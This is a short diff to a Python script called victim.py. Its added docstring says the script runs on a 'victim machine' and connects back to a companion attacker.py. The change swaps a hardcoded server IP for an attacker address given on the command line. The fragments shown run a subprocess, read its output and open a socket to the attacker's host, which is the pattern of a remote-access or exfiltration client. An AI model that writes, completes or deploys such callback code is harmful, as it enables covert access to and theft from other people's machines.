@@ -1,3 +1,7 @@
+"""  this script should run on the victim machine after
+     attacker.py started on the attacker machine
+     usage: python victim.py <attacker ip>
+     """
 import subprocess
 import os
 import sys
@@ -18,7 +22,7 @@ for string in p.stdout.read().split('\n'):
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Connect the socket to the port where the server is listening
-server_address = ("10.0.2.8", 8000)
+server_address = (sys.argv[1], 8000)
 sock.connect(server_address)
 print "connected to the server!"
 num = 0
